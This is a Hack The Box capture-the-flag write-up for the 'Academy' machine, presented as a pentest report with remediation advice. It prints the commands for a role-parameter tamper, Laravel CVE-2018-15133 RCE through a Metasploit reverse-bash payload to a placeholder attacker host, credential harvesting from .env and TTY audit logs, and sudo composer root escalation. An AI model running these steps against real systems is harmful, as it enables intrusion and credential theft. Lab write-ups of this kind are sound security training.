---
layout: writeup
title: "Academy"
platform: HTB
os: "Linux"
date: 2026-03-28
techniques: ["parameter manipulation","subdomain enumeration","laravel debug exposure","CVE-2018-15133","credential harvesting","log analysis","sudo abuse","GTFOBins"]
cve: ["CVE-2018-15133"]
description: "Parameter tampering grants admin access, exposing a staging subdomain with a Laravel debug page leaking the APP_KEY, which enables RCE. Recovered credentials and audit logs allow lateral movement, and a sudo-allowed composer binary leads to root."
---

# Academy - Technical Report

> **Platform:** Hack The Box \
> **Difficulty:** `Easy` \
> **Date:** 2026-03-28 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only 

---

## 0. Executive Summary

> The "Academy" machine was found to contain multiple weaknesses that, when chained together, allowed full system compromise. An attacker could manipulate a hidden registration parameter to gain administrative access, discover an internal staging subdomain, and abuse an exposed Laravel debug page to recover sensitive configuration data including the application key. This enabled remote code execution against the web application. Additional credentials were then recovered from local application files and audit logs, allowing movement between user accounts and eventual privilege escalation to root through an overly permissive `sudo` rule on `composer`. Immediate remediation should focus on removing debug exposure in production-facing environments, validating server-side authorization logic, rotating exposed secrets, and restricting dangerous sudo permissions.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation
of the **"Academy"** machine on Hack The Box.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined
in `methodology.md`.

---

## 2. Attack Chain

```text
Nmap → Hidden role parameter manipulation → Admin panel access → Staging subdomain discovery → Laravel debug page exposure → APP_KEY leak → CVE-2018-15133 RCE → .env credential recovery → SSH as cry0l1t3 → TTY audit log review → su to mrb3n → sudo composer abuse → Root
````

---

## 3. Tools Used

| Tool         | Purpose                                        |
| ------------ | ---------------------------------------------- |
| `nmap`       | Port scanning and service detection            |
| `gobuster`   | Directory enumeration                          |
| `Burp Suite` | Request interception and parameter tampering   |
| `Metasploit` | Exploitation of Laravel deserialization RCE    |
| `ssh`        | Authenticated remote access                    |
| `aureport`   | Review of TTY audit logs                       |
| `composer`   | Privilege escalation via sudo misconfiguration |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**

```bash
nmap -sC -sV -oA initial 10.129.10.106
nmap -sC -sV -p- -oA all_ports 10.129.10.106
```

**Findings:**

| Port  | Service | Version                         | Notes                                     |
| ----- | ------- | ------------------------------- | ----------------------------------------- |
| 22    | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 | Standard remote administration            |
| 80    | HTTP    | Apache httpd 2.4.41 (Ubuntu)    | Redirected to `academy.htb`               |
| 33060 | MySQL X | MySQL X Protocol                | Exposed but not required for exploitation |

**Key Observations:**

* The HTTP service redirected to `academy.htb`, requiring a local hosts entry.
* The attack surface appeared web-focused, with SSH likely useful after credential recovery.
* No immediately useful anonymous or legacy services were exposed.

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `gobuster`, `burpsuite`, manual inspection

**Findings:**

* Directory brute forcing returned limited results, including `/images/` and a forbidden `/server-status`.
* Manual inspection of the registration page source revealed a hidden form field:

  ```html
  <input type="hidden" value="0" name="roleid" />
  ```
* The presence of a client-side role value strongly suggested insecure trust in user-supplied authorization data.

### 5.2 Additional Services

#### 5.2.1 SSH

SSH was available but not immediately accessible without valid credentials. It became relevant later after credentials were recovered from the target.

#### 5.2.2 MySQL X Protocol

The MySQL X listener on port `33060` was identified during scanning but did not present a practical entry point during this assessment.

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Server-side trust in a user-controlled hidden role parameter
**Location:** Registration functionality on `academy.htb`
**Reasoning:**

The registration form included a hidden `roleid` field set to `0`. Hidden form values provide no real security and should never be trusted for authorization decisions. Because the application appeared to submit role selection directly from the client, this became the most promising initial vector.

### 6.2 Exploitation

The registration request was intercepted in Burp Suite and the hidden role value was modified before submission.

```bash
POST /register.php HTTP/1.1
Host: academy.htb

uid=test&password=test&confirm=test&roleid=1
```

After changing `roleid=0` to `roleid=1`, administrative access was granted and the `/admin.php` panel became accessible.

The admin panel contained an internal reference to a staging host:

```text
dev-staging-01.academy.htb
```

After adding this host locally and browsing to it, the application returned a Laravel debug page. This page exposed sensitive configuration details, including database settings and the Laravel `APP_KEY`. With the application key exposed, the target was vulnerable to **CVE-2018-15133**, a Laravel token unserialization issue that allows remote code execution in affected versions.

The issue was exploited using Metasploit with a command-based reverse shell payload.

```bash
use exploit/unix/http/laravel_token_unserialize_exec
set RHOSTS 10.129.10.106
set VHOST dev-staging-01.academy.htb
set APP_KEY <sanitized>
set payload cmd/unix/reverse_bash
set LHOST <attacker-ip>
set LPORT 4444
run
```

A shell was obtained as the web server user and stabilized for interactive use.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo
export TERM=xterm
export SHELL=/bin/bash
```

**Result:** User-level access obtained as `www-data`.

---

## 7. Lateral Movement

**From:** `www-data`
**To:** `cry0l1t3`, then `mrb3n`

**Method:**

* Application credentials were recovered from the Laravel `.env` file.
* Reused credentials provided SSH access as `cry0l1t3`.
* Membership in the `adm` group allowed review of TTY audit logs.
* Logged keystroke data exposed another user's password, enabling `su` to `mrb3n`.

From the web shell, the Laravel environment file was inspected:

```bash
cat /var/www/html/academy/.env
```

This revealed credentials that worked for SSH access as `cry0l1t3`.

After logging in, group membership was checked:

```bash
id
```

The user belonged to the `adm` group, which granted access to log data. TTY audit reports were then reviewed:

```bash
aureport --tty 2>/dev/null
```

A recorded password entry associated with a prior `su` command was visible in the logs, allowing a successful user switch to `mrb3n`.

```bash
su mrb3n
```

**Result:** Access obtained as `mrb3n`.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**

* [x] `sudo -l`
* [ ] SUID binaries  `find / -perm -4000 2>/dev/null`
* [ ] Cron jobs  `cat /etc/crontab`
* [ ] Writable files/dirs
* [ ] Capabilities  `getcap -r / 2>/dev/null`
* [ ] Running processes / internal ports
* [ ] Bash history / config files
* [ ] LinPEAS

**Key Findings:**

* The user `mrb3n` was allowed to run `/usr/bin/composer` with `sudo`.
* `composer` is a known GTFOBins candidate and can be abused to execute arbitrary commands as root.

### 8.2 Escalation Vector

**Vector:** `sudo` abuse of `/usr/bin/composer`
**Root Cause:**

Privilege escalation was possible because the target user was granted passwordless or permitted sudo execution of `composer`, which is a scripting-capable utility not intended to be exposed with elevated privileges. Because Composer supports custom scripts, it can be abused to run arbitrary commands as root.

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"id"}}' > $TF/composer.json
cd $TF
sudo /usr/bin/composer run-script x
```

In practice, direct command execution via the Composer script was more reliable than attempting to spawn an interactive root shell in the existing terminal context.

**Result:** Root/system-level access achieved.

---

## 9. Findings Summary

| # | Finding                                                                | Severity    | Location                       |
| - | ---------------------------------------------------------------------- | ----------- | ------------------------------ |
| 1 | Client-controlled role parameter enabled privilege assignment          | 🔴 Critical | Web registration functionality |
| 2 | Staging Laravel debug page exposed sensitive secrets including APP_KEY | 🔴 Critical | `dev-staging-01.academy.htb`   |
| 3 | Vulnerable Laravel instance allowed RCE via CVE-2018-15133             | 🔴 Critical | Staging web application        |
| 4 | Reusable credentials stored in application configuration               | 🟠 High     | Laravel `.env` file            |
| 5 | TTY audit logs exposed plaintext credentials to privileged local users | 🟠 High     | Local audit subsystem          |
| 6 | `sudo` access to Composer allowed root command execution               | 🔴 Critical | Local sudo configuration       |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

* Modified registration requests containing unexpected `roleid` values
* Requests to the staging host from unusual clients or networks
* Application errors or suspicious `X-XSRF-TOKEN` exploitation attempts
* Reverse shell activity initiated by the web server process
* SSH logins for `cry0l1t3` from new source IP addresses
* `aureport` usage and suspicious log inspection by non-administrative users
* `sudo /usr/bin/composer run-script` execution by `mrb3n`

### 10.2 Security Weaknesses

* Authorization decisions were exposed to and controlled by the client
* A staging/debug environment was reachable and leaked highly sensitive secrets
* Secrets were stored in plaintext and reused across trust boundaries
* Audit logs captured sensitive keystroke material accessible to non-root users
* Dangerous binaries were allowed through sudo without strict constraints

### 10.3 Hardening Recommendations

| Priority   | Recommendation                                                                     | Finding                                      |
| ---------- | ---------------------------------------------------------------------------------- | -------------------------------------------- |
| Immediate  | Remove public access to staging/debug environments and disable Laravel debug mode  | Debug page exposure                          |
| Immediate  | Rotate exposed application secrets, database credentials, and all reused passwords | APP_KEY and credential leakage               |
| Immediate  | Remove or tightly restrict sudo access to `composer`                               | Composer sudo abuse                          |
| Short-term | Enforce server-side role assignment and ignore client-supplied privilege values    | Role parameter tampering                     |
| Short-term | Review audit log retention and restrict access to sensitive TTY data               | TTY log credential exposure                  |
| Long-term  | Separate environments and credentials, and implement secret management controls    | Credential reuse and trust boundary failures |

---

## 11. Lessons Learned

* Hidden form fields are not security controls, and they are absolutely worth checking whenever a workflow smells even a little bit cursed.
* Laravel debug pages are catastrophic when exposed because they can hand over everything needed to move from “interesting error” to full RCE.
* The `adm` group can be way more powerful than it looks, especially when audit or log data contains plaintext user activity.
* GTFOBins-style abuse is still incredibly effective in labs and real environments when operational tools like `composer` are granted sudo rights without considering their scripting features.

---

*End of Report*
*Classification: Public  flags and sensitive values omitted*
